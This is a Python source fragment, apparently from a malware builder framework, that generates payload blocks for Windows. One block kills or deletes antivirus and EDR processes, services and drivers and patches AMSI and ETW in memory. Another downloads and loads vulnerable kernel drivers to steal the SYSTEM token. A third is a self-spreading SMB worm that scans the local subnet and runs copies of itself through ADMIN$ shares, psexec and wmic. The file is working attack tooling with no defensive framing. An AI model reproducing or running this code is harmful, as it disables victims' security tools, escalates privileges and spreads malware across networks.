    "McAfeeSvc.exe", "mfeann.exe", "mcshield.exe", "mfemms.exe",
    "mfetp.exe", "mfefire.exe", "masvc.exe", "macmnsvc.exe",
    "TrellixAgent.exe", "xagt.exe",
    "TmListen.exe", "TmCCSF.exe", "TMBMSRV.exe", "Ntrtscan.exe",
    "PccNTMon.exe", "TmPfw.exe", "TmProxy.exe",
    "SAVService.exe", "SophosHealth.exe", "SophosFS.exe",
    "SophosWebIntelligence.exe", "SophosUI.exe", "SophosClean.exe",
    "SEDService.exe", "hmpalert.exe",
    "bdagent.exe", "vsserv.exe", "bdredline.exe", "bdservicehost.exe",
    "BDAntiRansomware.exe",
    "WRSA.exe", "WRCoreService.x64.exe", "WRConsumerService.exe",
    "MBAMService.exe", "mbamtray.exe", "MBAMProtection.exe", "MBAMHelper.exe",
    "AvastSvc.exe", "AvastUI.exe", "ashServ.exe", "avgnt.exe",
    "avguard.exe", "avgwdsvc.exe", "AVGSvc.exe",
    "Avira.ServiceHost.exe", "Avira.Systray.exe", "sched.exe",
    "fshoster32.exe", "fshoster64.exe", "fsaua.exe", "fsav32.exe",
    "fssm32.exe", "fsgk32.exe",
    "CortexXDR.exe", "Traps.exe", "cytool.exe", "cyverak.exe",
    "cyserver.exe", "CyOptics.exe", "PanGPS.exe", "PanGPA.exe",
    "xagtnotif.exe", "FireEyeAgent.exe", "endpointsecurity.exe",
    "ccSvcHst.exe", "Rtvscan.exe", "Smc.exe", "SymCorpUI.exe",
    "SepMasterService.exe", "sesm.exe", "SNAC.exe",
    "FortiEDR.Agent.exe", "FortiEDR.exe", "FortiESNAC.exe", "fmon.exe",
    "cmdagent.exe", "cavwp.exe", "cis.exe", "cavscan.exe",
    "AVK.exe", "GDScan.exe", "GDFirewallTray.exe",
    "PSANHost.exe", "PandaUrlFilter.exe", "PandaUniversalAgent.exe",
    "CPDA.exe", "CPFileScan.exe", "CpSvcWrapper.exe",
    "sfc.exe", "sfcdaemon.exe", "iptray.exe", "immunetprotect.exe",
    "wgpr.exe", "Wgx.exe",
]

AV_SERVICES = [
    "WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "wscsvc",
    "MsSecFlt", "WdBoot", "WdFilter", "WdNisDrv",
    "CSFalconService", "CSFalconContainer", "CSAgent",
    "SentinelAgent", "SentinelServiceHost", "SentinelStaticEngine",
    "CarbonBlack", "CbDefense", "CbSensorApi", "CbStreamingService",
    "RepMgr", "RepUtils", "CylanceSvc", "CyProtectDrv",
    "ekrn", "EraAgentSvc", "AVP", "klnagent",
    "McAfeeFramework", "McAfeeEngineService", "mcshield",
    "mfemms", "mfevtp", "mfefire", "masvc",
    "TmListen", "TmCCSF", "TMBMSRV", "Ntrtscan", "TmPfw",
    "SAVService", "SophosHealth", "SophosFS", "SEDService",
    "VSSERV", "BDESVC", "BDAuxSrv",
    "WRCoreService", "WRConsumerService", "MBAMService", "MBAMProtection",
    "AvastSvc", "avgwd", "Avira.ServiceHost", "AntiVirService",
    "F-Secure Hoster", "FSMA", "FSGK", "CortexXDR", "Traps", "cyverak",
    "SepMasterService", "SmcService", "FortiEDR", "FA_Scheduler",
    "cmdAgent", "cmdGuard", "PandaUniversalAgent", "PSANHost",
    "CPDA", "CPFileScan", "CiscoAMP", "sfc", "xagt", "FireEyeAgent",
]

AV_DRIVERS = [
    "WdFilter", "WdBoot", "WdNisDrv", "MsSecFlt",
    "CSFalcon", "CsfalconDrv", "SentinelDrv",
    "CarbonBlackK", "CbProtectDrv", "CyProtectDrv", "CyOpticsDrv",
    "eamonm", "ehdrv", "epfw", "edevmon",
    "kl1", "klif", "klif2", "klflt",
    "mfeaack", "mfeavfk", "mfebopk", "mfeelamk",
    "tmactmon", "tmcomm", "tmevtmgr", "tmprefilter",
    "SAVOnAccess", "SophosED", "SophosEDDriver",
    "avc3", "avckf", "bdselfpr", "trufos", "WRkrn",
    "aswArPot", "aswFsBlk", "aswMonFlt", "aswSnx", "aswSP",
    "avgmfx64", "avgntflt", "avipbb", "avkmgr",
    "fsgkfilt", "fsatpfilter",
    "SymEFA", "SymEvent", "SymIRON", "SRTSP",
    "FortiEDRDrv", "cmdGuard", "cmdHlp",
    "PandaDrv", "pavdrv", "cpav", "cpfilter",
    "CiscoAMPCEFDriver", "CiscoAMPHeurDriver",
    "WgxDrv", "TDRDrv", "PanFlt", "PanMonFlt", "PanNetFlt",
]


def _av_kill_taskkill():
    if not IS_WINDOWS:
        return 0
    print("[*] AV Killer: taskkill...")
    killed = 0
    for proc in AV_PROCESSES:
        try:
            r = subprocess.run(
                ["taskkill", "/F", "/IM", proc, "/T"],
                capture_output=True, text=True, timeout=5,
                creationflags=0x08000000)
            if r.returncode == 0:
                killed += 1
        except Exception:
            continue
    print("[+] taskkill: " + str(killed) + " killed")
    return killed


def _av_kill_nt_terminate():
    if not IS_WINDOWS:
        return 0
    print("[*] AV Killer: NtTerminateProcess...")
    try:
        import ctypes
        from ctypes import wintypes
        ntdll = ctypes.windll.ntdll
        k32 = ctypes.windll.kernel32
        snapshot = k32.CreateToolhelp32Snapshot(0x00000002, 0)
        if snapshot == -1:
            return 0

        class PE32(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD), ("th32DefaultHeapID", ctypes.c_void_p),
                ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", wintypes.DWORD), ("szExeFile", ctypes.c_char * 260),
            ]
        pe = PE32()
        pe.dwSize = ctypes.sizeof(PE32)
        killed = 0
        if k32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                name = pe.szExeFile.decode('utf-8', errors='ignore')
                if name in AV_PROCESSES:
                    try:
                        h = k32.OpenProcess(0x0001, False, pe.th32ProcessID)
                        if h:
                            if ntdll.NtTerminateProcess(h, 0) == 0:
                                killed += 1
                            k32.CloseHandle(h)
                    except Exception:
                        pass
                if not k32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
        k32.CloseHandle(snapshot)
        print("[+] NtTerminateProcess: " + str(killed) + " killed")
        return killed
    except Exception:
        return 0


def _av_stop_services():
    if not IS_WINDOWS:
        return 0
    print("[*] AV Killer: stop services...")
    stopped = 0
    for svc in AV_SERVICES:
        try:
            r = subprocess.run(["sc", "stop", svc],
                              capture_output=True, timeout=10,
                              creationflags=0x08000000)
            if r.returncode == 0:
                stopped += 1
            subprocess.run(["sc", "config", svc, "start=", "disabled"],
                          capture_output=True, timeout=10, creationflags=0x08000000)
            subprocess.run(["sc", "delete", svc],
                          capture_output=True, timeout=10, creationflags=0x08000000)
        except Exception:
            continue
    print("[+] stopped " + str(stopped) + " services")
    return stopped


def _av_unload_drivers():
    if not IS_WINDOWS:
        return 0
    print("[*] AV Killer: unload drivers...")
    unloaded = 0
    for drv in AV_DRIVERS:
        try:
            r = subprocess.run(["sc", "stop", drv],
                              capture_output=True, timeout=10,
                              creationflags=0x08000000)
            if r.returncode == 0:
                unloaded += 1
            subprocess.run(["sc", "config", drv, "start=", "disabled"],
                          capture_output=True, timeout=10, creationflags=0x08000000)
            subprocess.run(["sc", "delete", drv],
                          capture_output=True, timeout=10, creationflags=0x08000000)
        except Exception:
            continue
    print("[+] unloaded " + str(unloaded) + " drivers")
    return unloaded


def _av_patch_amsi_etw_combo():
    if not IS_WINDOWS:
        return 0
    print("[*] AV Killer: AMSI+ETW patch...")
    patched = 0
    try:
        import ctypes
        from ctypes import wintypes
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if amsi:
            addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if addr:
                patch = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
                old = wintypes.DWORD(0)
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
                ctypes.memmove(addr, patch, len(patch))
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
                patched += 1
        ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
        for fn_name in [b"EtwEventWrite", b"EtwEventWriteFull", b"NtTraceEvent"]:
            addr = ctypes.windll.kernel32.GetProcAddress(ntdll, fn_name)
            if addr:
                patch = bytes([0x33, 0xC0, 0xC3])
                old = wintypes.DWORD(0)
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
                ctypes.memmove(addr, patch, len(patch))
                ctypes.windll.kernel32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
                patched += 1
    except Exception:
        pass
    return patched


def _run_av_killer():
    if not AV_KILLER_ENABLED or not IS_WINDOWS:
        return
    print("=" * 60)
    print("AV/EDR KILLER")
    print("=" * 60)
    total = 0
    try:
        _av_patch_amsi_etw_combo()
    except Exception:
        pass
    try:
        total += _av_kill_taskkill()
    except Exception:
        pass
    try:
        total += _av_kill_nt_terminate()
    except Exception:
        pass
    try:
        _av_stop_services()
    except Exception:
        pass
    try:
        _av_unload_drivers()
    except Exception:
        pass
    print("=" * 60)
    print("AV KILLER COMPLETED - total killed: " + str(total))
    print("=" * 60)


# ==================== END AV KILLER ====================

"""

    # ═══════════════════════════════════════════════════════════════
    # BYOVD BLOCK (Windows-only)
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_byovd_block(opts, names):
        byovd_enabled = opts.get("BYOVD_ENABLED", True)
        byovd_driver = opts.get("BYOVD_DRIVER", "gdrv")
        byovd_driver_b64 = opts.get("BYOVD_DRIVER_B64", "")
        has_embedded = bool(byovd_driver_b64 and len(byovd_driver_b64) > 100)

        parts = []
        parts.append("")
        parts.append(
            "# ==================== BYOVD (with Download) ===================="
        )
        parts.append("BYOVD_ENABLED = " + str(byovd_enabled))
        parts.append('BYOVD_DRIVER = "' + byovd_driver + '"')
        parts.append('BYOVD_DRIVER_B64 = """' + byovd_driver_b64 + '"""')
        parts.append("BYOVD_HAS_EMBEDDED_DRIVER = " + str(has_embedded))
        parts.append("")
        parts.append("BYOVD_DEVICE_PATHS = {")
        parts.append('    "gdrv": "\\\\\\\\.\\\\GIO",')
        parts.append('    "rtcore64": "\\\\\\\\.\\\\RTCore64",')
        parts.append('    "winio": "\\\\\\\\.\\\\WinIO",')
        parts.append('    "kprocesshacker": "\\\\\\\\.\\\\KProcessHacker3",')
        parts.append('    "dbgv": "\\\\\\\\.\\\\DBUtil_2_3",')
        parts.append('    "cpuz": "\\\\\\\\.\\\\CPUZ141",')
        parts.append('    "aswark": "\\\\\\\\.\\\\AsUpIO",')
        parts.append("}")
        parts.append("")
        parts.append("BYOVD_DRIVER_FILENAMES = {")
        parts.append('    "gdrv": "gdrv.sys",')
        parts.append('    "rtcore64": "RTCore64.sys",')
        parts.append('    "winio": "WinIO64.sys",')
        parts.append('    "dbgv": "DBUtil_2_3.sys",')
        parts.append('    "cpuz": "cpuz141_x64.sys",')
        parts.append('    "aswark": "AsUpIO64.sys",')
        parts.append('    "kprocesshacker": "kprocesshacker.sys",')
        parts.append("}")
        parts.append("")
        parts.append("BYOVD_DRIVER_URLS = {")
        parts.append('    "gdrv": [')
        parts.append(
            '        "https://raw.githubusercontent.com/ihsandincer/Vulnerable-Drivers/main/gdrv.sys",'
        )
        parts.append("    ],")
        parts.append('    "rtcore64": [')
        parts.append(
            '        "https://raw.githubusercontent.com/ihsandincer/Vulnerable-Drivers/main/RTCore64.sys",'
        )
        parts.append("    ],")
        parts.append('    "winio": [')
        parts.append(
            '        "https://raw.githubusercontent.com/ihsandincer/Vulnerable-Drivers/main/WinIO64.sys",'
        )
        parts.append("    ],")
        parts.append('    "dbgv": [')
        parts.append(
            '        "https://raw.githubusercontent.com/ihsandincer/Vulnerable-Drivers/main/DBUtil_2_3.sys",'
        )
        parts.append("    ],")
        parts.append("}")
        parts.append("")
        parts.append("BYOVD_IOCTLS = {")
        parts.append('    "gdrv": {"read_phys": 0xC3502588, "write_phys": 0xC350258C},')
        parts.append(
            '    "rtcore64": {"read_phys": 0x8000642C, "write_phys": 0x80006430},'
        )
        parts.append(
            '    "winio": {"read_phys": 0x80102040, "write_phys": 0x80102044},'
        )
        parts.append('    "cpuz": {"read_phys": 0x80006424, "write_phys": 0x80006428},')
        parts.append('    "dbgv": {"read_phys": 0x9B0C1EC4, "write_phys": 0x9B0C1EC8},')
        parts.append('    "aswark": {"read_phys": 0x00222010, "write_phys": 0x00222014},')
        parts.append('    "kprocesshacker": {"read_phys": 0x1B0010, "write_phys": 0x1B0014},')
        parts.append("}")
        parts.append("")

        steal_fn = names["byovd_steal_fn"]
        install_fn = names["byovd_install_fn"]
        open_fn = names["byovd_open_fn"]
        readphys_fn = names["byovd_readphys_fn"]
        writephys_fn = names["byovd_writephys_fn"]

        parts.append(f"def {steal_fn}_rand_service():")
        parts.append(
            '    return "drv_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))'
        )
        parts.append("")
        parts.append(f"def {steal_fn}_enable_priv(priv):")
        parts.append("    try:")
        parts.append("        import win32security, win32api, win32con")
        parts.append("        h = win32security.OpenProcessToken(")
        parts.append("            win32api.GetCurrentProcess(),")
        parts.append(
            "            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)"
        )
        parts.append("        luid = win32security.LookupPrivilegeValue(None, priv)")
        parts.append(
            "        win32security.AdjustTokenPrivileges(h, False, [(luid, win32con.SE_PRIVILEGE_ENABLED)])"
        )
        parts.append("        win32api.CloseHandle(h)")
        parts.append("        return True")
        parts.append("    except Exception:")
        parts.append("        return False")
        parts.append("")
        parts.append(f"def {steal_fn}_write_driver(b64, filename):")
        parts.append("    try:")
        parts.append("        sysroot = os.environ.get('SystemRoot', 'C:\\\\Windows')")
        parts.append("        drvdir = os.path.join(sysroot, 'System32', 'drivers')")
        parts.append("        target = os.path.join(drvdir, filename)")
        parts.append("        if not os.path.exists(drvdir):")
        parts.append("            os.makedirs(drvdir, exist_ok=True)")
        parts.append("        try:")
        parts.append("            with open(target, 'wb') as f:")
        parts.append("                f.write(base64.b64decode(b64))")
        parts.append("            return target")
        parts.append("        except PermissionError:")
        parts.append(
            "            target = os.path.join(tempfile.gettempdir(), filename)"
        )
        parts.append("            with open(target, 'wb') as f:")
        parts.append("                f.write(base64.b64decode(b64))")
        parts.append("            return target")
        parts.append("    except Exception:")
        parts.append("        return None")
        parts.append("")
        parts.append(f"def {steal_fn}_download_driver(driver_name):")
        parts.append(
            "    filename = BYOVD_DRIVER_FILENAMES.get(driver_name, driver_name + '.sys')"
        )
        parts.append(
            "    cache = os.path.join(os.path.expanduser('~'), '.lazyframework', 'drivers')"
        )
        parts.append("    os.makedirs(cache, exist_ok=True)")
        parts.append("    target = os.path.join(cache, filename)")
        parts.append(
            "    if os.path.exists(target) and os.path.getsize(target) > 1024:"
        )
        parts.append("        return target")
        parts.append("    urls = BYOVD_DRIVER_URLS.get(driver_name, [])")
        parts.append("    if not urls:")
        parts.append("        return None")
        parts.append("    import urllib.request")
        parts.append("    for url in urls:")
        parts.append("        try:")
        parts.append(
            "            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})"
        )
        parts.append(
            "            with urllib.request.urlopen(req, timeout=30) as resp:"
        )
        parts.append("                data = resp.read()")
        parts.append("            if len(data) < 1024 or data[:2] != b'MZ':")
        parts.append("                continue")
        parts.append("            with open(target, 'wb') as f:")
        parts.append("                f.write(data)")
        parts.append("            return target")
        parts.append("        except Exception:")
        parts.append("            continue")
        parts.append("    return None")
        parts.append("")
        parts.append(f"def {install_fn}(driver_path, service_name):")
        parts.append("    try:")
        parts.append("        subprocess.run(")
        parts.append("            ['sc', 'create', service_name, 'type=', 'kernel',")
        parts.append("             'start=', 'demand', 'binPath=', driver_path],")
        parts.append("            capture_output=True, text=True, timeout=10)")
        parts.append("        result = subprocess.run(")
        parts.append("            ['sc', 'start', service_name],")
        parts.append("            capture_output=True, text=True, timeout=30)")
        parts.append(
            "        return result.returncode == 0 or 'already running' in result.stdout.lower()"
        )
        parts.append("    except Exception:")
        parts.append("        return False")
        parts.append("")
        parts.append(f"def {open_fn}(driver_name):")
        parts.append("    device = BYOVD_DEVICE_PATHS.get(driver_name)")
        parts.append("    if not device:")
        parts.append("        return None")
        parts.append("    try:")
        parts.append("        h = ctypes.windll.kernel32.CreateFileW(")
        parts.append(
            "            device, 0x80000000 | 0x40000000, 0, None, 3, 0x80, None)"
        )
        parts.append("        if h == -1:")
        parts.append("            return None")
        parts.append("        return h")
        parts.append("    except Exception:")
        parts.append("        return None")
        parts.append("")
        parts.append(f"def {readphys_fn}(handle, driver_name, phys, size):")
        parts.append("    try:")
        parts.append("        ioctls = BYOVD_IOCTLS.get(driver_name)")
        parts.append("        if not ioctls:")
        parts.append("            return None")
        parts.append("        input_data = struct.pack('<QQ', phys, size)")
        parts.append(
            "        inbuf = ctypes.create_string_buffer(input_data, len(input_data))"
        )
        parts.append("        outbuf = ctypes.create_string_buffer(size)")
        parts.append("        bytes_ret = ctypes.wintypes.DWORD(0)")
        parts.append("        r = ctypes.windll.kernel32.DeviceIoControl(")
        parts.append("            handle, ioctls['read_phys'], inbuf, len(input_data),")
        parts.append("            outbuf, size, ctypes.byref(bytes_ret), None)")
        parts.append("        if r == 0:")
        parts.append("            return None")
        parts.append("        return bytes(outbuf.raw[:bytes_ret.value])")
        parts.append("    except Exception:")
        parts.append("        return None")
        parts.append("")
        parts.append(f"def {writephys_fn}(handle, driver_name, phys, data):")
        parts.append("    try:")
        parts.append("        ioctls = BYOVD_IOCTLS.get(driver_name)")
        parts.append("        if not ioctls:")
        parts.append("            return False")
        parts.append("        input_data = struct.pack('<Q', phys) + data")
        parts.append(
            "        inbuf = ctypes.create_string_buffer(input_data, len(input_data))"
        )
        parts.append("        bytes_ret = ctypes.wintypes.DWORD(0)")
        parts.append("        r = ctypes.windll.kernel32.DeviceIoControl(")
        parts.append(
            "            handle, ioctls['write_phys'], inbuf, len(input_data),"
        )
        parts.append("            None, 0, ctypes.byref(bytes_ret), None)")
        parts.append("        return r != 0")
        parts.append("    except Exception:")
        parts.append("        return False")
        parts.append("")
        parts.append(f"def {steal_fn}(driver_name, driver_b64=''):")
        parts.append("    if not BYOVD_ENABLED or not IS_WINDOWS:")
        parts.append("        return False")
        parts.append(f"    {steal_fn}_enable_priv('SeDebugPrivilege')")
        parts.append(f"    {steal_fn}_enable_priv('SeLoadDriverPrivilege')")
        parts.append(
            "    filename = BYOVD_DRIVER_FILENAMES.get(driver_name, driver_name + '.sys')"
        )
        parts.append(f"    service_name = {steal_fn}_rand_service()")
        parts.append("    driver_path = None")
        parts.append("    if driver_b64:")
        parts.append(
            f"        driver_path = {steal_fn}_write_driver(driver_b64, filename)"
        )
        parts.append("    if not driver_path:")
        parts.append(f"        driver_path = {steal_fn}_download_driver(driver_name)")
        parts.append("    if not driver_path:")
        parts.append("        print('[!] BYOVD: No driver available')")
        parts.append("        return False")
        parts.append(f"    {install_fn}(driver_path, service_name)")
        parts.append("    time.sleep(0.5)")
        parts.append(f"    handle = {open_fn}(driver_name)")
        parts.append("    if not handle:")
        parts.append("        try:")
        parts.append(
            "            subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=10)"
        )
        parts.append(
            "            subprocess.run(['sc', 'delete', service_name], capture_output=True, timeout=10)"
        )
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        return False")
        parts.append("")
        parts.append("    def v2p(va):")
        parts.append("        if 0xFFFFF80000000000 <= va < 0xFFFFF80080000000:")
        parts.append("            return va - 0xFFFFF80000000000")
        parts.append("        return None")
        parts.append("")
        parts.append("    def rq(va):")
        parts.append("        phys = v2p(va)")
        parts.append("        if not phys:")
        parts.append("            return 0")
        parts.append(f"        d = {readphys_fn}(handle, driver_name, phys, 8)")
        parts.append("        if d and len(d) >= 8:")
        parts.append("            return struct.unpack('<Q', d[:8])[0]")
        parts.append("        return 0")
        parts.append("")
        parts.append("    def wq(va, val):")
        parts.append("        phys = v2p(va)")
        parts.append("        if not phys:")
        parts.append("            return False")
        parts.append(
            f"        return {writephys_fn}(handle, driver_name, phys, struct.pack('<Q', val))"
        )
        parts.append("")
        parts.append("    try:")
        parts.append("        import win32api")
        parts.append("        drivers = win32api.EnumDeviceDrivers()")
        parts.append("        nt_base = None")
        parts.append("        for d in drivers:")
        parts.append("            try:")
        parts.append("                name = win32api.GetDeviceDriverBasename(d)")
        parts.append("                if name and 'ntoskrnl' in name.lower():")
        parts.append("                    nt_base = d")
        parts.append("                    break")
        parts.append("            except Exception:")
        parts.append("                continue")
        parts.append("        if not nt_base and drivers:")
        parts.append("            nt_base = drivers[0]")
        parts.append("    except Exception:")
        parts.append("        nt_base = 0xFFFFF80000000000")
        parts.append("")
        parts.append("    ps_init = None")
        parts.append("    for off in [0x3C1B20, 0x3C1B30, 0x3C1B40]:")
        parts.append("        val = rq(nt_base + off)")
        parts.append(
            "        if val and 0xFFFF000000000000 <= val <= 0xFFFFFFFFFFFFFFFF:"
        )
        parts.append("            for po in [0x440, 0x2E8, 0x2E0]:")
        parts.append("                if rq(val + po) == 4:")
        parts.append("                    ps_init = val")
        parts.append("                    break")
        parts.append("        if ps_init:")
        parts.append("            break")
        parts.append("")
        parts.append("    if not ps_init:")
        parts.append("        print('[!] BYOVD: Cannot find PsInitialSystemProcess')")
        parts.append("        try:")
        parts.append("            ctypes.windll.kernel32.CloseHandle(handle)")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        try:")
        parts.append(
            "            subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=10)"
        )
        parts.append(
            "            subprocess.run(['sc', 'delete', service_name], capture_output=True, timeout=10)"
        )
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        return False")
        parts.append("")
        parts.append("    pid_off, links_off, tok_off = 0x440, 0x448, 0x4B8")
        parts.append(
            "    for po, lo, to in [(0x440, 0x448, 0x4B8), (0x2E8, 0x2F0, 0x360)]:"
        )
        parts.append("        if rq(ps_init + po) == 4:")
        parts.append("            pid_off, links_off, tok_off = po, lo, to")
        parts.append("            break")
        parts.append("")
        parts.append("    cur_pid = ctypes.windll.kernel32.GetCurrentProcessId()")
        parts.append("    head = ps_init + links_off")
        parts.append("    link = rq(head)")
        parts.append("    target = None")
        parts.append("    for _ in range(1000):")
        parts.append("        if not link or link == head:")
        parts.append("            break")
        parts.append("        ep = link - links_off")
        parts.append("        if rq(ep + pid_off) == cur_pid:")
        parts.append("            target = ep")
        parts.append("            break")
        parts.append("        link = rq(link)")
        parts.append("")
        parts.append("    if not target:")
        parts.append("        try:")
        parts.append("            ctypes.windll.kernel32.CloseHandle(handle)")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        try:")
        parts.append(
            "            subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=10)"
        )
        parts.append(
            "            subprocess.run(['sc', 'delete', service_name], capture_output=True, timeout=10)"
        )
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        return False")
        parts.append("")
        parts.append("    src_tok = rq(ps_init + tok_off)")
        parts.append("    tgt_tok = rq(target + tok_off)")
        parts.append("    if not src_tok:")
        parts.append("        try:")
        parts.append("            ctypes.windll.kernel32.CloseHandle(handle)")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        return False")
        parts.append("    new_tok = (src_tok & ~0xF) | (tgt_tok & 0xF)")
        parts.append("    ok = wq(target + tok_off, new_tok)")
        parts.append("    try:")
        parts.append("        ctypes.windll.kernel32.CloseHandle(handle)")
        parts.append("    except Exception:")
        parts.append("        pass")
        parts.append("    try:")
        parts.append(
            "        subprocess.run(['sc', 'stop', service_name], capture_output=True, timeout=10)"
        )
        parts.append(
            "        subprocess.run(['sc', 'delete', service_name], capture_output=True, timeout=10)"
        )
        parts.append("    except Exception:")
        parts.append("        pass")
        parts.append("    return ok")
        parts.append("")
        parts.append("")
        parts.append("def _run_byovd_escalation():")
        parts.append("    if not BYOVD_ENABLED or not IS_WINDOWS:")
        parts.append("        return False")
        parts.append("    try:")
        parts.append("        if ctypes.windll.shell32.IsUserAnAdmin() != 0:")
        parts.append("            un = os.environ.get('USERNAME', '').upper()")
        parts.append("            if un == 'SYSTEM' or un.endswith('$'):")
        parts.append("                return True")
        parts.append("    except Exception:")
        parts.append("        pass")
        parts.append("    print('[*] BYOVD: Attempting escalation...')")
        parts.append(f"    ok = {steal_fn}(")
        parts.append("        BYOVD_DRIVER,")
        parts.append("        BYOVD_DRIVER_B64 if BYOVD_HAS_EMBEDDED_DRIVER else '')")
        parts.append("    if ok:")
        parts.append("        print('[+] BYOVD: SYSTEM privileges obtained!')")
        parts.append("    return ok")
        parts.append("")
        parts.append("")
        parts.append("# ==================== END BYOVD ====================")
        parts.append("")

        return "\n".join(parts)

    # ═══════════════════════════════════════════════════════════════
    # SMB WORM BLOCK (Windows-only)
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_smb_worm_block(opts, names):
        smb_spread = opts.get("SMB_SPREAD", True)
        smb_methods = opts.get(
            "SMB_METHODS", "smb,wmi,psexec,admin_share,remote_schtasks,scmr"
        )
        smb_max_hosts = opts.get("SMB_MAX_HOSTS", 50)
        smb_scan_subnets = opts.get("SMB_SCAN_SUBNETS", "auto")
        smb_timeout = opts.get("SMB_TIMEOUT", 5)
        smb_credentials = opts.get("SMB_CREDENTIALS", "")
        smb_payload_name = opts.get("SMB_PAYLOAD_NAME", "svchost.exe")
        smb_persist = opts.get("SMB_PERSIST", True)
        smb_self_exec = opts.get("SMB_SELF_EXEC", True)

        return f"""
# ==================== SMB WORM (Windows) ====================
SMB_SPREAD_ENABLED = {str(smb_spread)}
SMB_METHODS = "{smb_methods}".split(",")
SMB_MAX_HOSTS = {smb_max_hosts}
SMB_SCAN_SUBNETS = "{smb_scan_subnets}"
SMB_TIMEOUT = {smb_timeout}
SMB_CREDENTIALS = "{smb_credentials}"
SMB_PAYLOAD_NAME = "{smb_payload_name}"
SMB_PERSIST = {str(smb_persist)}
SMB_SELF_EXEC = {str(smb_self_exec)}


def _get_self_path():
    try:
        return os.path.abspath(sys.argv[0])
    except Exception:
        return None


def _get_local_subnets():
    subnets = set()
    try:
        import socket as _s
        try:
            s = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            parts = ip.split(".")
            subnets.add(".".join(parts[:3]) + ".0/24")
        except Exception:
            pass
    except Exception:
        pass
    return list(subnets)


def _scan_network(subnets, max_hosts=50):
    if not subnets:
        subnets = _get_local_subnets()
    live = []
    scanned = 0
    print("[*] Scanning " + str(len(subnets)) + " subnet(s)...")
    import socket as _s
    for subnet in subnets:
        if "/24" not in subnet:
            continue
        base = subnet.replace(".0/24", "")
        for i in range(1, 255):
            if scanned >= max_hosts * 2 or len(live) >= max_hosts:
                break
            ip = base + "." + str(i)
            scanned += 1
            try:
                for port in [445, 5985]:
                    sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
                    sock.settimeout(0.3)
                    r = sock.connect_ex((ip, port))
                    sock.close()
                    if r == 0:
                        if ip not in live:
                            live.append(ip)
                        break
            except Exception:
                continue
    return live[:max_hosts]


def _spread_admin_share(target, payload_path):
    try:
        share = "\\\\\\\\" + target + "\\\\ADMIN$\\\\" + SMB_PAYLOAD_NAME
        r = subprocess.run(
            ["cmd", "/c", "copy", "/Y", payload_path, share],
            capture_output=True, text=True, timeout=SMB_TIMEOUT + 5,
            creationflags=0x08000000)
        return r.returncode == 0
    except Exception:
        return False


def _spread_psexec(target):
    try:
        r = subprocess.run(["where", "psexec.exe"],
                          capture_output=True, text=True, timeout=5,
                          creationflags=0x08000000)
        if r.returncode != 0:
            return False
        remote = "C:\\\\Windows\\\\Temp\\\\" + SMB_PAYLOAD_NAME
        r = subprocess.run(
            ["psexec.exe", "\\\\\\\\" + target, "-accepteula", "-nobanner",
             "-d", "-s", remote],
            capture_output=True, text=True, timeout=SMB_TIMEOUT + 10,
            creationflags=0x08000000)
        return r.returncode == 0
    except Exception:
        return False


def _spread_wmi(target):
    try:
        remote = "\\\\\\\\" + target + "\\\\C$\\\\Windows\\\\Temp\\\\" + SMB_PAYLOAD_NAME
        cmd = 'wmic /node:"' + target + '" process call create "' + remote + '"'
        r = subprocess.run(["cmd", "/c", cmd], capture_output=True, text=True,
                          timeout=SMB_TIMEOUT + 10, creationflags=0x08000000)
        return r.returncode == 0
    except Exception:
        return False


def _smb_spread():
    if not SMB_SPREAD_ENABLED or not IS_WINDOWS:
        return 0
    print("[*] SMB worm: Starting...")
    self_path = _get_self_path()
    if not self_path or not os.path.exists(self_path):
        return 0
    if SMB_SCAN_SUBNETS.lower() == "auto":
        subnets = _get_local_subnets()
    else:
        subnets = [s.strip() for s in SMB_SCAN_SUBNETS.split(",")]
    if not subnets:
        return 0
    targets = _scan_network(subnets, SMB_MAX_HOSTS)
    if not targets:
        return 0
    infected = 0
    for target in targets:
        try:
            if not _spread_admin_share(target, self_path):
                continue
            if SMB_SELF_EXEC:
                if "psexec" in SMB_METHODS:
                    _spread_psexec(target)
                elif "wmi" in SMB_METHODS:
                    _spread_wmi(target)
            infected += 1
        except Exception:
            continue
    print("[+] SMB worm: Infected " + str(infected) + "/" + str(len(targets)))
    return infected


def _start_smb_spread_thread():
    def _worker():
        try:
            time.sleep(random.uniform(30, 90))
            _smb_spread()
        except Exception:
            pass
    t = threading.Thread(target=_worker, daemon=True)
    t.start()


# ==================== END SMB WORM ====================

"""

